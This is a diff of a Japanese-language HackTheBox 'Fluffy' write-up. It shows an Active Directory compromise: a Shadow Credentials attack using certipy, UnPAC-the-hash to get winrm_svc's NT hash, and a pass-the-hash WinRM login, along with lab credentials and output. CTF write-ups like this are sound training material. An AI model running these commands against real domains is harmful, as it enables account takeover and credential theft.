@@ -215,17 +215,19 @@ LDAP        10.129.180.164  389    DC01             Resolved collection methods:
 LDAP        10.129.180.164  389    DC01             Done in 01M 02S
 LDAP        10.129.180.164  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.180.164_2025-10-26_134930_bloodhound.zip
 ```
-winrm_svcにshadowcredentialsを追加できるパスを発見  
+genericwrite権限を使用して、p.agilaからwinrm_svcのshadowcredentialsを作成できるパスを発見  
 shadowcredentialsのわかりやすい記事は[こちら](https://eladshamir.com/2021/06/21/Shadow-Credentials.html)  
+攻撃者が作成したpfxに対応する公開鍵を、ターゲットのmsDS-KeyCredentialLink属性に設定することで認証に成功し、  
+ターゲットのtgtを取得できるイメージ  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_02.png">  
-ちなみにshadowcredentialsを悪用するために必要なpkinitが構成されていることを確認
+ちなみにshadowcredentialsを作成するために必要なpkinitが構成されていることを確認
 ```sh
-└─$ netexec ldap 10.129.250.233 -u 'p.agila' -p 'prometheusx-303' -M adcs 
-LDAP        10.129.250.233  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
-LDAP        10.129.250.233  389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
-ADCS        10.129.250.233  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
-ADCS        10.129.250.233  389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
-ADCS        10.129.250.233  389    DC01             Found CN: fluffy-DC01-CA
+└─$ netexec ldap 10.129.180.164 -u 'p.agila' -p 'prometheusx-303' -M adcs 
+LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
+LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
+ADCS        10.129.180.164  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        10.129.180.164  389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
+ADCS        10.129.180.164  389    DC01             Found CN: fluffy-DC01-CA
 ```
 genericall権限を使用して、service accountsグループに加入
 ```sh
@@ -243,8 +245,10 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
   3. p.agila
   4. winrm_svc
 ```
+それでは、攻撃者が作成したpfxに対応する公開鍵をwinrm_svcに設定を実施  
+step1では5986番はクロースであったため、pfxを使用したpassthecertificateによるwinrmログインはできないもよう
 ```sh
-└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc add
+└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.180.164 -account winrm_svc add
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -260,7 +264,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'winrm_svc.pfx'
 [*] Saved certificate and private key to 'winrm_svc.pfx'
  
-└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc list
+└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.180.164 -account winrm_svc list
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -270,13 +274,28 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Listing Key Credentials for 'winrm_svc'
 [*] DeviceID: cb4bca07df824ab2b9fcdcc8d9637716 | Creation Time (UTC): 2025-10-27 00:29:31
 ```
-
-
-
-genericwrite権限を使用してshadowcredentialswを追加し、tgt取得
-ここでntハッシュも取得しているが
+pfxを使用してwinrm_svcのtgtを取得できた、また同時にwinrm_svcのntハッシュも取得できた  
+pkinit環境下のtgtおよびtgsには、pacにntハッシュが含まれる設定になっている  
+tgtはkrbtgtキーのみ復号可能だが、自身に対するtgsの場合は自身のセッションキーで復号可能となり、結果pac内のntハッシュが取得可能になる  
+詳細は[こちら](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash#theory)や[こちら](https://labs.lares.com/fear-kerberos-pt2/#UNPAC)
 ```sh
-└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc auto
+└─$ certipy-ad auth -pfx winrm_svc.pfx -username winrm_svc -domain fluffy.htb -dc-ip 10.129.180.164 
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
+```
+ちなみに「auto」コマンドで、公開鍵登録からtgt取得までを自動的に実行できるので便利
+```sh
+└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.180.164 -account winrm_svc auto
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -302,8 +321,10 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Successfully restored the old Key Credentials for 'winrm_svc'
 [*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
 ```
+今回はpassthehashでwinrmログイン成功  
+ユーザフラグゲット
 ```sh
-└─$ evil-winrm -i 10.129.250.233 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+└─$ evil-winrm -i 10.129.180.164 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                         
 Evil-WinRM shell v3.7
                                         
